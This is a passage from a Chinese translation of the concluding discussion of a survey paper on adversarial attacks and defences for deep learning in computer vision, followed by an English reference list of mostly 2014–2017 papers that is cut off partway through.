**这种威胁是真实存在的：**虽然很少有研究表明，对抗性攻击深度学习可能不是一个严重的问题，但大量相关文献表明并非如此。在第3节和第4节中回顾的文献清楚地表明，对抗性攻击可以严重降低深度学习技术在多个计算机视觉任务上的性能。特别是，第4节回顾的文献确定，在现实世界中，深度学习容易受到对抗性攻击。因此，我们可以得出结论，对抗性攻击对实践中的深度学习构成了真正的威胁。 **对抗性脆弱性是一种普遍现象：**文献回顾表明，在计算机视觉中，不同类型的深层神经网络（如MLPs、CNNs、RNNs）在识别、分割、检测等多种任务上都被成功地愚弄。尽管现有的研究大多集中于在分类/识别任务上愚弄深度学习，但根据调查的文献，我们可以很容易地观察到，深度学习方法通常容易受到对手攻击。 对抗性例子通常具有很好的泛化性：文献中所报道的对抗性例子的一个最常见的特性是它们在不同的神经网络之间有很好的传递。对于架构相对相似的网络来说尤其如此。在黑盒攻击中，对抗性例子的推广经常被利用。 **对抗性脆弱性的原因需要更多的研究：**关于深层神经网络对微妙的对抗性扰动的脆弱性背后的原因，文献中有不同的观点。通常情况下，这些观点并不完全一致。这方面显然需要进行系统的调查。 **线性确实促进了脆弱性：**Goodfello等人[23]首先提出，现代深层神经网络的设计迫使它们在高维空间中线性行为，也使它们容易受到对手的攻击。虽然这一概念很流行，但在文献中也遭到了一些反对。我们的调查指出，多个独立的贡献，保持神经网络的线性负责他们的脆弱性对抗性攻击。基于这一事实，我们可以说，线性确实促进了深层神经网络对对手攻击的脆弱性。然而，这似乎不是用廉价的分析扰动就成功愚弄深层神经网络的唯一原因。 **反措施是可能的：**尽管存在多种防御技术来对抗对抗对手的攻击，但文献中经常显示，通过设计反措施，可以再次成功地攻击被防御的模型，例如[49]。这一观察结果需要新的防御措施也提供一个对明显的反措施的鲁棒性估计。 高度活跃的研究方向： 深层神经网络对一般扰动的脆弱性的深刻暗示使得对抗性攻击及其防御的研究近年来非常活跃。在这项调查中回顾的大多数文献都是在过去两年中出现的，目前这方面的贡献源源不断。一方面，人们提出了一些技术来保护神经网络免受已知的攻击，另一方面，越来越多的强大的攻击被设计出来。最近，还组织了一次卡格尔竞赛。我们希望，这项高水平的研究活动最终会使深度学习方法足够强大，能够用于现实世界中的安全和安保关键应用。 ¶8 CONCLUSION 本文首次全面综述了计算机视觉深度学习对抗性攻击的发展方向。尽管深度神经网络在各种各样的计算机视觉任务中具有很高的精度，但人们发现它们容易受到细微的输入扰动的影响，从而导致它们完全改变其输出。由于深度学习是当前机器学习和人工智能发展的核心，这一发现导致了许多设计对抗性攻击及其深度学习防御的最新贡献。本文回顾了这些贡献，主要集中在最有影响和最有趣的作品在文学。从回顾的文献来看，对抗性攻击显然是对实践中深入学习的真正威胁，尤其是在安全和安保关键应用中。现有文献表明，目前的深度学习不仅可以在网络空间中有效地攻击，而且可以在物理世界中有效地攻击。然而，由于这一研究方向的高度活跃性，可以希望深度学习能够在未来显示出相当强的对抗对手攻击的鲁棒性。 ¶REFERENCES 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217[1] Y. LeCun, Y. Bengio and G. Hinton, Deep learning, Nature, vol. 521, no. 7553, pp. 436-444, 2015.[2] M.Helmstaedter,K.L.Briggman,S.C.Turaga,V.Jain,H.S.Seung, and W. Denk, Connectomic reconstruction of the inner plexiform layer in the mouse retina. Nature, vol. 500, no. 7461, pp. 168-174, 2013.[3] H. Y. Xiong, B. Alipanahi, J. L. Lee, H. Bretschneider, D. Merico, R. K. Yuen, and Q. Morris, The human splicing code reveals new insights into the genetic determinants of disease, Science, vol. 347, no. 6218, 1254806 2015.[4] J.Ma,R.P.Sheridan,A.Liaw,G.E.DahlandV.Svetnik,Deepneural nets as a method for quantitative structure-activity relationships, Journal of chemical information and modeling, vol. 55, no. 2 pp. 263-274, 2015.[5] T. Ciodaro, D. Deva, J. de Seixas and D. Damazio, Online particle detection with neural networks based on topological calorimetry infor- mation. Journal of physics: conference series. vol. 368, no. 1. IOP Publishing, 2012.[6] Kaggle. Higgs boson machine learning challenge. Kaggle https:&#x2F;&#x2F; www.kaggle.com&#x2F;c&#x2F;higgs-boson, 2014.[7] G. Hinton, L. Deng, D. Yu, G. E. Dahl, A. R. Mohamed, N. Jaitly, and B. Kingsbury, Deep neural networks for acoustic modeling in speech recognition: The shared views of four research groups, IEEE Signal Processing Magazine, vol. 29, no. 6, pp. 82-97, 2012.[8] I. Sutskever, O. Vinyals, and Q. V. Le, Sequence to sequence learning with neural networks. In Advances in neural information processing systems, pp. 3104-3112, 2014.[9] A. Krizhevsky, I. Sutskever and G. E. Hinton, Imagenet classification with deep convolutional neural networks. In Advances in neural infor- mation processing systems, pp. 1097-1105, 2012.[10] Y. LeCun, B. Boser, J. S. Denker, D. Henderson, R. E. Howard, W. Hubbard and L. D. Jackel, Backpropagation applied to handwritten zip code recognition. Neural computation, vol. 1m no. 4, pp. 541-551, 1989.[11] J. Deng, W. Dong, R. Socher, L. J. Li, K. Li, and L. Fei-Fei, Imagenet: A large-scale hierarchical image database. In IEEE Conference on Computer Vision and Pattern Recognition, pp. 248-255, 2009.[12] E. Ackerman, How Drive.ai is mastering au- tonomous driving with deep learning, https:&#x2F;&#x2F;spectrum. ieee.org&#x2F;cars- that- think&#x2F;transportation&#x2F;self- driving&#x2F;how- driveai- is- mastering- autonomous- driving- with- deep- learning, Accessed December 2017.[13] M. M. Najafabadi, F. Villanustre, T. M. Khoshgoftaar, N. Seliya, R. Wald and E. Muharemagic, Deep learning applications and challenges in big data analytics, Journal of Big Data, vol. 2, no. 1, 2015.[14] D. Silver, J. Schrittwieser, K. Simonyan, I. Antonoglou, A. Huang, A. Guez, Y. Chen, Mastering the game of go without human knowledge. Nature, vol. 550, no. 7676, pp. 354-359, 2017.[15] K. He, X. Zhang, S. Ren, J. Sun, Deep residual learning for image recognition. In Proceedings of the IEEE conference on computer vision and pattern recognition, pp. 770-778, 2016.[16] S. M. Moosavi-Dezfooli, A. Fawzi, O. Fawzi and P. Frossard, Uni- versal adversarial perturbations. In Proceedings of IEEE Conference on Computer Vision and Pattern Recognition (CVPR), 2017.[17] K. Chatfield, K. Simonyan, A. Vedaldi, A. Zisserman, Return of the devil in the details: Delving deep into convolutional nets, arXiv preprint arXiv:1405.3531, 2014.[18] C. Szegedy, W. Liu, Y. Jia, P. Sermanet, S. Reed, D. Anguelov, A. Rabinovich, Going deeper with convolutions. In Proceedings of the IEEE conference on computer vision and pattern recognition, pp. 1-9, 2015.[19] J. Lu, H. Sibai, E. Fabry, D. Forsyth, Standard detectors aren’t (currently) fooled by physical adversarial stop signs, arXiv preprint arXiv:1710.03337, 2017.[20] R. Fletcher, Practical methods of optimization, John Wiley and Sons, 2013.[21] A. Esteva, B. Kuprel, R. A. Novoa, J. Ko, S. M. Swetter, H. M. Blau, S. Thrun, Dermatologist-level classification of skin cancer with deep neural networks, Nature, vol. 542, pp. 115 - 118, 2017.[22] C. Szegedy, W. Zaremba, I. Sutskever, J. Bruna, D. Erhan, I. Goodfellow, R. Fergus, Intriguing properties of neural networks, arXiv preprint arXiv:1312.6199, 2014.[23] I. J. Goodfellow, J. Shlens, C. Szegedy, Explaining and Harnessing Adversarial Examples, arXiv preprint arXiv:1412.6572, 2015.[24] S.Gu,L.Rigazio,TowardsDeepNeuralNetworkArchitecturesRobust to Adversarial Examples, arXiv preprint arXiv:1412.5068, 2015[25] P. Tabacof, E. Valle, Exploring the Space of Adversarial Images, In IEEE International Joint Conference on Neural Networks, pp. 426- 433, 2016.[26] S.Sabour,Y.Cao,F.Faghri,andD.J.Fleet,Adversarialmanipulation of deep representations, arXiv preprint arXiv:1511.05122, 2015.[27] U. Shaham, Y. Yamada, S. Negahban, Understanding Adversarial Training: Increasing Local Stability of Neural Nets through Robust Optimization, arXiv preprint arXiv:1511.05432, 2016.[28] C. Lyu, K. Huang, H. Liang, A Unified Gradient Regularization Family for Adversarial Examples, In IEEE International Conference on Data Mining, pp. 301-309, 2015.[29] I. Evtimov, K. Eykholt, E. Fernandes, T. Kohno, B. Li, A. Prakash, A. Rahmati, D. Song, Robust Physical-World Attacks on Deep Learning Models, arXiv preprint arXiv:1707.08945, 2017.[30] J. Lu, H. Sibai, E. Fabry, D. Forsyth, No need to worry about adversarial examples in object detection in autonomous vehicles, arXiv preprint arXiv:1707.03501, 2017.[31] Y. Liu, W. Zhang, S. Li, N. Yu, Enhanced Attacks on Defensively Distilled Deep Neural Networks, arXiv preprint arXiv:1711.05934, 2017.[32] H. Hosseini, Y. Chen, S. Kannan, B. Zhang, R. Poovendran, Block- ing transferability of adversarial examples in black-box learning systems, arXiv preprint arXiv:1703.04318, 2017.[33] T. Gu, B. Dolan-Gavitt, S. Garg, BadNets: Identifying Vulnerabil- ities in the Machine Learning Model Supply Chain. arXiv preprint arXiv:1708.06733, 2017.[34] N. Papernot, P. McDaniel, A. Sinha, M. Wellman, Towards the Science of Security and Privacy in Machine Learning, arXiv preprint arXiv:1611.03814, 2016.[35] A. Kurakin, I. Goodfellow, S. Bengio, Adversarial examples in the physical world, arXiv preprint arXiv:1607.02533, 2016.[36] N. Carlini, D. Wagner, Towards Evaluating the Robustness of Neural Networks, arXiv preprint arXiv:1608.04644, 2016.[37] N. Das, M. Shanbhogue, S. Chen, F. Hohman, L. Chen, M. E. Kounavis, D. H. Chau, Keeping the Bad Guys Out: Protecting and Vaccinating Deep Learning with JPEG Compression, arXiv preprint arXiv:1705.02900, 2017.\\[38] N. Papernot, P. McDaniel, X. Wu, S. Jha, A. Swami, Distillation as a Defense to Adversarial Perturbations against Deep Neural Networks, In IEEE Symposium on Security and Privacy (SP), pp. 582-597, 2016.[39] N. Papernot, P. McDaniel, I. Goodfellow, S. Jha, Z. B. Celik, A. Swami, Practical Black-Box Attacks against Machine Learning, In Proceedings of the ACM on Asia Conference on Computer and Communications Security, pp. 506-519. ACM, 2017.[40] X. Xu, X. Chen, C. Liu, A. Rohrbach, T. Darell, D. Song, Can you fool AI with adversarial examples on a visual Turing test?, arXiv preprint arXiv:1709.08693, 2017[41] P. Chen, H. Zhang, Y. Sharma, J. Yi, C. Hsieh, ZOO: Zeroth Order Optimization based Black-box Attacks to Deep Neural Networks without Training Substitute Models, In Proceedings of 10th ACM Workshop on Artificial Intelligence and Security (AISEC), 2017.[42] S. Baluja, I. Fischer, Adversarial Transformation Networks: Learning to Generate Adversarial Examples, arXiv preprint arXiv:1703.09387, 2017. [43] W. Xu, D. Evans, Y. Qi, Feature Squeezing: Detecting Adversarial Examples in Deep Neural Networks, arXiv preprint arXiv:1704.01155,2017.[44] L. Nguyen, A. Sinha, A Learning and Masking Approach to Secure Learning, arXiv preprint arXiv:1709.04447, 2017.[45] Dongyu Meng, Hao Chen, MagNet: a Two-Pronged Defense against Adversarial Examples, In Proceedings of ACM Conference on Computer and Communications Security (CCS), 2017.[46] V. Zantedeschi, M. Nicolae, A. Rawat, Efficient Defenses AgainstAdversarial Attacks, arXiv preprint arXiv:1707.06728, 2017.[47] J. Hayes, G. Danezis, Machine Learning as an Adversarial Ser- vice: Learning Black-Box Adversarial Examples, arXiv preprint arXiv:1708.05207, 2017.[48] A. Graese, A. Rozsa, T. E. Boult, Assessing Threat of Adversarial Examples on Deep Neural Networks, In IEEE International Conference on Machine Learning and Applications, pp. 69-74, 2016.[49] N. Carlini, D. Wagner, Adversarial Examples Are Not Easily Detected: Bypassing Ten Detection Methods, arXiv preprint arXiv:1705.07263, 2017.[50] B. Liang, H. Li, M. Su, X. Li, W. Shi, X. Wang, Detecting Adversarial Examples in Deep Networks with Adaptive Noise Reduction, arXiv preprint arXiv:1705.08378, 2017.[51] A. Arnab, O. Miksik, P. H. S. Torr, On the Robustness of Se-mantic Segmentation Models to Adversarial Attacks, arXiv preprint arXiv:1711.09856, 2017.[52] A. S. Ross, F. Doshi-Velez, Improving the Adversarial Robustness and Interpretability of Deep Neural Networks by Regularizing their Input Gradients, arXiv preprint arXiv:1711.09404, 2017.[53] Y. Song, T. Kim, S. Nowozin, S. Ermon, N. Kushman, PixelDefend:Leveraging Generative Models to Understand and Defend against Adver-sarial Examples, arXiv preprint arXiv:1710.10766, 2017.[54] N. Narodytska, S. P. Kasiviswanathan, Simple Black-Box Adversarial Perturbations for Deep Networks, arXiv preprint arXiv:1612.06299,2016.[55] A. Madry, A. Makelov, L. Schmidt, D. Tsipras, A. Vladu, Towards Deep Learning Models Resistant to Adversarial Attacks, arXiv preprint arXiv:1706.06083, 2017.[56] Z. Sun, M. Ozay, T. Okatani, HyperNetworks with statistical filtering for defending adversarial examples, arXiv preprint arXiv:1711.01791, 2017.[57] K. Grosse, P. Manoharan, N. Papernot, M. Backes, P. McDaniel, On the (Statistical) Detection of Adversarial Examples, arXiv preprint arXiv:1702.06280, 2017.[58] S. Shen, G. Jin, K. Gao, Y. Zhang, APE-GAN: Adversarial Perturba- tion Elimination with GAN, arXiv preprint arXiv:1707.05474, 2017.[59] N. Carlini, G. Katz, C. Barrett, D. L. Dill, Ground-Truth Adversarial Examples, arXiv preprint arXiv:1709.10207, 2017.[60] N. Papernot, P. McDaniel, S. Jha, M. Fredrikson, Z. B. Celik, A. Swami, The Limitations of Deep Learning in Adversarial Settings, In Proceedings of IEEE European Symposium on Security and Privacy, 2016.[61] K. Grosse, N. Papernot, P. Manoharan, M. Backes, P. McDaniel, Adversarial Perturbations Against Deep Neural Networks for Malware Classification, arXiv preprint arXiv:1606.04435, 2016.[62] S. Huang, N. Papernot, I. Goodfellow, Y. Duan, P. Abbeel, Adversarial Attacks on Neural Network Policies, arXiv preprint arXiv:1702.02284, 2017.[63] M. Melis, A. Demontis, B. Biggio, G. Brown, G. Fumera, F. Roli, Is Deep Learning Safe for Robot Vision? Adversarial Examples against the iCub Humanoid, arXiv preprint arXiv:1708.06939, 2017.[64] I. Rosenberg, A. Shabtai, L. Rokach, Y. Elovici, Generic Black-Box End-to-End Attack against RNNs and Other API Calls Based Malware Classifiers, arXiv preprint arXiv:1707.05970, 2017.[65] A. Athalye, L. Engstrom, A. Ilyas, K. Kwok, Synthesizing Robust Adversarial Examples, arXiv preprint arXiv:1707.07397, 2017.[66] J. Lu, T. Issaranon, D. Forsyth, SafetyNet: Detecting and Rejecting Adversarial Examples Robustly, arXiv preprint arXiv:1704.00103, 2017.[67] J. H. Metzen, M. C. Kumar, T. Brox, V. Fischer Universal Adversarial Perturbations Against Semantic Image Segmentation, In Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition, pp.2755-2764, 2017.[68] J. Su, D. V. Vargas, S. Kouichi, One pixel attack for fooling deep neural networks, arXiv preprint arXiv:1710.08864, 2017.[69] A. Fawzi, S. Moosavi-Dezfooli, P. Frossard, Robustness of classifiers:from adversarial to random noise, In Advances in Neural Information Processing Systems, pp.1632-1640, 2016.[70] S.Moosavi-Dezfooli, A. Fawzi, O.Fawzi, P. Frossard, SSoatto, Analysis of universal adversarial perturbations, arXiv preprint arXiv:1705.09554, 2017.[71] A. Fawzi, O. Fawzi, P. Frossard, Analysis of classifiers’ robustness toadversarial perturbations, arXiv preprint arXiv:1502.02590, 2015.[72] S. Moosavi-Dezfooli, A. Fawzi, P. Frossard, DeepFool: a simple and accurate method to fool deep neural networks, In Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition, pp.2574-2582, 2016.[73] C. Kanbak, SS. Moosavi-Dezfooli, P. Frossard, Geometric robustness of deep networks: analysis and improvement, arXiv preprint arXiv:1711.09115, 2017.[74] T. Tanay, L. Griffin, A Boundary Tilting Persepective on the Phenomenon of Adversarial Examples, arXiv preprint arXiv:1608.07690,2016.[75] I. Evtimov, K. Eykholt, E. Fernandes, T. Kohno, B. Li, A. Prakash,A. Rahmati, D. Song, Robust Physical-World Attacks on Deep Learning Models, arXiv preprint arXiv:1707.08945, 2017[76] W. He, J. Wei, X. Chen, N. Carlini, D. Song, Adversarial Example Defenses: Ensembles of Weak Defenses are not Strong, arXiv preprint arXiv:1706.04701, 2017.[77] F. Tramer, A. Kurakin, N. Papernot, D. Boneh, P. McDaniel,Ensemble Adversarial Training: Attacks and Defenses, arXiv preprint arXiv:1705.07204, 2017.[78] J. H. Metzen, T. Genewein, V. Fischer, B. Bischoff, On Detecting Adversarial Perturbations, arXiv preprint arXiv:1702.04267, 2017. [79] C. Xie, J. Wang, Z.Zhang, Z. Ren, A. Yuille, Mitigating adversarial effects through randomization, arXiv preprint arXiv:1711.01991, 2017. [80] A. Kurakin, I. Goodfellow, S. Bengio, Adversarial Machine Learning at Scale, arXiv preprint arXiv:1611.01236, 2017.[81] N. Akhtar, J. Liu, A. Mian, Defense against Universal Adversarial Perturbations, arXiv preprint arXiv:1711.05929, 2017.[82] C. Guo, M. Rana, M. Cisse, L. Maaten, Countering Adversarial Images using Input Transformations, arXiv preprint arXiv:1711.00117,2017.[83] A. Galloway, G. W. Taylor, M. Moussa, Attacking Binarized Neural Networks, arXiv preprint arXiv:1711.00449, 2017.[84] N. Papernot, P. McDaniel, Extending Defensive Distillation, arXiv preprint arXiv:1705.05264, 2017.[85] T. Na, J. H. Ko, S. Mukhopadhyay, Cascade Adversarial Machine Learning Regularized with a Unified Embedding, arXiv preprint arXiv:1708.02582, 2017.[86] R. Feinman, R. R. Curtin, S. Shintre, A. B. Gardner, Detecting Adversarial Samples from Artifacts, arXiv preprint arXiv:1703.00410, 2017.[87] X. Zeng, C. Liu, Y. Wang, W. Qiu, L. Xie, Y. Tai, C. K. Tang, A. L. Yuille, Adversarial Attacks Beyond the Image Space, arXiv preprint arXiv:1711.07183, 2017.[88] Y. Liu, X. Chen, C. Liu, D. Song, Delving into Transferable Adversarial Examples and Black-box Attacks, arXiv preprint arXiv:1611.02770, 2017.[89] T. Strauss, M. Hanselmann, A. Junginger, H. Ulmer, Ensemble Methods as a Defense to Adversarial Perturbations Against Deep Neural Networks, arXiv preprint arXiv:1709.03423, 2017.[90] S. Sankaranarayanan, A. Jain, R. Chellappa, S. N. Lim, Regulariz- ing deep networks using efficient layerwise adversarial training, arXiv preprint arXiv:1705.07819, 2017.[91] E. D. Cubuk, B. Zoph, S. S. Schoenholz, Q. V. Le, Intriguing Properties of Adversarial Examples, arXiv preprint arXiv:1711.02846, 2017.[92] T. Gebhart, P. Schrater, Adversary Detection in Neural Networks via Persistent Homology, arXiv preprint arXiv:1711.10056, 2017.[93] J. Bradshaw, A. G. Matthews, Z. Ghahramani, Adversarial Examples, Uncertainty, and Transfer Testing Robustness in Gaussian Process Hybrid Deep Networks, arXiv preprint arXiv:1707.02476, 2017.[94] A. Rozsa, E. M. Rudd, T. E. Boult, Adversarial Diversity and Hard Positive Generation, arXiv preprint arXiv:1605.01775, 2016.[95] O. Bastani, Y. Ioannou, L. Lampropoulos, D. Vytiniotis, A. Nori, A. Criminisi, Measuring Neural Net Robustness with Constraints, arXiv preprint arXiv:1605.07262, 2017.[96] J. Z. Kolter, E. Wong, Provable defenses against adversarial ex- amples via the convex outer adversarial polytope, arXiv preprint arXiv:1711.00851, 2017.[97] A. Rozsa, M. Geunther, T. E. Boult, Are Accuracy and Robustness Correlated?, In IEEE International Conference on Machine Learning and Applications, pp. 227-232, 2016.[98] H. Hosseini, B. Xiao, M. Jaiswal, R. Poovendran, On the Limitation of Convolutional Neural Networks in Recognizing Negative Images, arXiv preprint arXiv:1703.06857, 2017.[99] M. Cisse, P. Bojanowski, E. Grave, Y. Dauphin, N. Usunier, Par- seval Networks: Improving Robustness to Adversarial Examples, arXiv preprint arXiv:1704.08847, 2017.[100] N. Cheney, M. Schrimpf, G. Kreiman, On the Robustness of Convolutional Neural Networks to Internal Architecture and Weight Perturbations, arXiv preprint arXiv:1703.08245, 2017.[101] H. Lee, S. Han, J. Lee, Generative Adversarial Trainer: Defense to Adversarial Perturbations with GAN, arXiv preprint arXiv:1705.03387, 2017.[102] A. Rozsa, M. Gunther, T. E. Boult, Towards Robust Deep Neural Networks with BANG, arXiv preprint arXiv:1612.00138, 2017.[103] T. Miyato, S. Maeda, M. Koyama, S. Ishii, Virtual Adversarial Training: a Regularization Method for Supervised and Semi-supervised Learning, arXiv preprint 1704.03976, 2017.[104] D. Arpit, S. Jastrzebski, N. Ballas, D. Krueger, E. Bengio, M. S. Kanwal, T. Maharaj, A. Fischer, A. Courville, Y. Bengio, S. Lacoste- Julien, A Closer Look at Memorization in Deep Networks, arXiv preprint arXiv:1706.05394, 2017.[105] X. Li, F. Li, Adversarial Examples Detection in Deep Networks with Convolutional Filter Statistics, In Proceedings of International Con- ference on Computer Vision, 2017.[106] T. Lee, M. Choi, S. Yoon, Manifold Regularized Deep Neural Networks using Adversarial Examples, arXiv preprint arXiv:1511.06381, 2016.[107] K. Grosse, N. Papernot, P. Manoharan, M. Backes, and P. McDaniel, Adversarial examples for malware detection, In European Sym- posium on Research in Computer Security, pp. 62-79. 2017.[108] N. Papernot, and P. McDaniel, On the effectiveness of defensive distillation, arXiv preprint arXiv:1607.05113, 2016.[109] N. Papernot, Patrick McDaniel, and Ian Goodfellow, Transfer- ability in machine learning: from phenomena to black-box attacks using adversarial samples, arXiv preprint arXiv:1605.07277, 2016.[110] N. Papernot, P. McDaniel, A. Swami, and R. Harang, Crafting adversarial input sequences for recurrent neural networks, In IEEE Military Communications Conference, pp. 49-54, 2016.[111] N. Papernot, I. Goodfellow, R. Sheatsley, R. Feinman, and P.McDaniel. Cleverhans v1. 0.0: an adversarial machine learning library,arXiv preprint arXiv:1610.00768, 2016.[112] I. Goodfellow, N. Papernot, and P. McDaniel, cleverhans v0. 1: an adversarial machine learning library, arXiv preprint arXiv:1610.00768, 2016.[113] T. Miyato, A. M. Dai, and Ian Goodfellow, Adversarial Train- ing Methods for Semi-Supervised Text Classification, arXiv preprint arXiv:1605.07725, 2016.[114] A. Nguyen, J. Yosinski, and J. Clune, Deep neural networks are easily fooled: High confidence predictions for unrecognizable images, In Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition, pp. 427-436, 2015.[115] C. Xie, J. Wang, Z. Zhang, Y. Zhou, L. Xie, and A. Yuille, Adversarial Examples for Semantic Segmentation and Object Detection, arXiv preprint arXiv:1703.08603, 2017.[116] S. Zheng, Y. Song, T. Leung, and I. Goodfellow, Improving the ro- bustness of deep neural networks via stability training, In Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition, pp. 4480-4488, 2016.[117] P. Tabacof, and E. Valle, Exploring the space of adversarial images, In IEEE International Joint Conference on Neural Networks, pp. 426-433, 2016.[118] A. Fawzi, O. Fawzi, and P. Frossard, Fundamental limits on ad- versarial robustness, In Proceedings of ICML, Workshop on Deep Learning. 2015.[119] Y. Luo, Xavier Boix, Gemma Roig, Tomaso Poggio, and Qi Zhao, Foveation-based mechanisms alleviate adversarial examples, arXiv preprint arXiv:1511.06292, 2015.[120] J. Jin, A. Dundar, and E. Culurciello, Robust convolutional neural networks under adversarial noise, arXiv preprint arXiv:1511.06306, 2015.[121] J. Kos, I. Fischer, and D. Song, Adversarial examples for generative models, arXiv preprint arXiv:1702.06832, 2017.[122] Q. Wang, W. Guo, K. Zhang, I. I. Ororbia, G. Alexander, X. Xing, C. L. Giles, and X Liu, Adversary Resistant Deep Neural Networks with an Application to Malware Detection, arXiv preprint arXiv:1610.01239, 2016.[123] G. K. Dziugaite, Z. Ghahramani, and D. M. Roy, A study of the effect of JPG compression on adversarial images, arXiv preprint arXiv:1608.00853, 2016.[124] A. Nayebi, and S. Ganguli, Biologically inspired protection of deep networks from adversarial attacks, arXiv preprint arXiv:1703.09202, 2017.[125] W. Hu, and Y. Tan, Generating Adversarial Malware Examples for Black-Box Attacks Based on GAN, arXiv preprint arXiv:1702.05983, 2017.[126] G. Katz, C. Barrett, D. L. Dill, K. Julian, and M. J. Kochenderfer, Towards proving the adversarial robustness of deep neural networks, arXiv preprint arXiv:1709.02802, 2017.[127] D. Krotov, and J. J. Hopfield. Dense Associative Memory is Robust to Adversarial Inputs, arXiv preprint arXiv:1701.00939, 2017.[128] P. Tabacof, T. Julia, E. Valle, Adversarial images for variational autoencoders, arXiv preprint arXiv:1612.00155, 2016.[129] Q. Wang, W. Guo, I. I. Ororbia, G. Alexander, X. Xing, L. Lin, C. L. Giles, X. Liu, P. Liu, and G. Xiong, Using non-invertible data transformations to build adversary-resistant deep neural networks, arXiv preprint arXiv:1610.01934, 2016.[130] A. Rozsa, M. Geunther, E. M. Rudd, and T. E. Boult. ”Facial at- tributes: Accuracy and adversarial robustness.” Pattern Recognition Letters (2017).[131] M. Cisse, Y. Adi, N. Neverova, and J. Keshet, Houdini: Fooling deep structured prediction models, arXiv preprint arXiv:1707.05373, 2017.[132] F. Tramer, N. Papernot, I. Goodfellow, D. Boneh, and P. Mc- Daniel, The Space of Transferable Adversarial Examples, arXiv preprint arXiv:1704.03453, 2017.[133] S. J. Oh, M. Fritz, and B. Schiele, Adversarial Image Perturbation for Privacy Protection–A Game Theory Perspective, arXiv preprint arXiv:1703.09471, 2017.[134] Y. Lin, Z. Hong, Y. Liao, M. Shih, M. Liu, and M. Sun, Tactics of Adversarial Attack on Deep Reinforcement Learning Agents, arXiv preprint arXiv:1703.06748, 2017.[135] K. R. Mopuri, U. Garg, and R. V. Babu, Fast Feature Fool: A data independent approach to universal adversarial perturbations, arXiv preprint arXiv:1707.05572, 2017.[136] N. Kardan, and K. O. Stanley, Mitigating fooling with competitive overcomplete output layer neural networks, In International Joint Con- ference on Neural Networks pp. 518-525, 2017.[137] Y. Dong, H. Su, J. Zhu, and F. Bao, Towards Interpretable Deep Neural Networks by Leveraging Adversarial Examples, arXiv preprint arXiv:1708.05493, 2017.[138] Q. Wang, W. Guo, K. Zhang, I. I. Ororbia, G. Alexander, X. Xing, C. L. Giles, and X. Liu, Learning Adversary-Resistant Deep Neural Networks, arXiv preprint arXiv:1612.01401, 2016.[139] J. Gao, B. Wang, Z. Lin, W. Xu, and Y. Qi, DeepCloak: Masking Deep Neural Network Models for Robustness Against Adversarial Samples, (2017).[140] W. Xu, D. Evans, and Y. Qi, Feature Squeezing Mitigates and Detects Carlini&#x2F;Wagner Adversarial Examples, arXiv preprint arXiv:1705.10686, 2017.[141] W. Bai, C. Quan, and Z. Luo, Alleviating adversarial attacks via convolutional autoencoder, In International Conference on Soft- ware Engineering, Artificial Intelligence, Networking and Paral- lel&#x2F;Distributed Computing (SNPD), pp. 53-58, 2017.[142] A. P. Norton, Y. Qi, Adversarial-Playground: A visualization suite showing how adversarial examples fool deep learning, In IEEE Sympo- sium on Visualization for Cyber Security, pp. 1-4, 2017.[143] Y. Dong, F. Liao, T. Pang, X. Hu, and J. Zhu, Discovering Adversar- ial Examples with Momentum, arXiv preprint arXiv:1710.06081, 2017. [144] S. Shen, R. Furuta, T. Yamasaki, and K. Aizawa, Fooling Neural Networks in Face Attractiveness Evaluation: Adversarial Examples with High Attractiveness Score But Low Subjective Score, In IEEE ThirdInternational Conference on Multimedia Big Data, pp. 66-69, 2017. [145] C. Szegedy, V. Vincent, S. Ioffe, J. Shlens, and Z. Wojna. Rethinking the inception architecture for computer vision, In Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition, pp.2818-282, 2016.[146] S. Sarkar, A. Bansal, U. Mahbub, and R. Chellappa, UPSET andANGRI: Breaking High Performance Image Classifiers, arXiv preprintarXiv:1707.01159, 2017.[147] K. He, X. Zhang, S. Ren, and J. Sun, Deep residual learning for imagerecognition, In Proceedings of the IEEE conference on computervision and pattern recognition, pp. 770-778, 2016.[148] S. Das, and P. N. Suganthan, Differential evolution: A survey of thestate-of-the-art, IEEE transactions on evolutionary computation vol.15, no. 1, pp. 4-31, 2011.[149] J. Redmon and A. Farhadi. Yolo9000: better, faster, stronger, arXivpreprint arXiv:1612.08242, 2016.[150] S. Ren, K. He, R. Girshick, and J. Sun, Faster r-cnn: Towards real-time object detection with region proposal networks, In Advances inneural information processing systems, pages 91-99, 2015.[151] D. Amodei, R. Anubhai, E. Battenberg, C. Case, J. Casper, B. Catanzaro, J. Chen, M. Chrzanowski, A. Coates, G. Diamos. Deep speech 2: End-to-end speech recognition in English and Mandarin, arXivpreprint arXiv:1512.02595, 2015.[152] A. Krizhevsky, Learning multiple layers of features from tiny image,2009.[153] Diederik P Kingma and Max Welling, Auto-encoding variationalbayes, arXiv preprint arXiv:1312.6114, 2013.[154] Y. Bengio, Learning deep architectures for AI, Foundations andtrends in Machine Learning vol. 2, no. 1, pp. 1-127, 2009.[155] D. E. Rumelhart, G. E. Hinton, and R. J. Williams, Learning representations by back-propagating errors, Cognitive modeling, vol.5, 1988.[156] S. Hochreiter and J. Schmidhuber, Long short-term memory, Neuralcomputation, vol. 9, no. 8, pp. 1735-1780, 1997.[157] M. Volodymyr, K. Kavukcuoglu, D. Silver, A. A. Rusu, J. Veness,M. G. Bellemare, A. Graves, M. Riedmiller, A. K. Fidjeland, G. Ostrovski, Human-level control through deep reinforcement learning, Nature, vol. 518, no. 7540, pp. 529-533, 2015.[158] M. Volodymyr, A. P. Badia, and M. Mirza, Asynchronous methods for deep reinforcement learning In International Conference on Ma- chine Learning, 2016.[159] J. Long, E. Shelhamer, and T. Darrell, Fully convolutional networks for semantic segmentation, In Proceedings of IEEE Conference on Computer Vision and Pattern Recognition, 2015.[160] A. Rozsa,M. Gunther, E. M. Rudd, and T. E. Boult, Are facial attributes adversarially robust? In International Conference on Pattern Recognition, pp. 3121-3127, 2016.[161] Z. Liu, P. Luo, X. Wang, X. Tang, Deep learning face attributes in the wild, International Conference on Computer Vision, pp. 3730-3738, 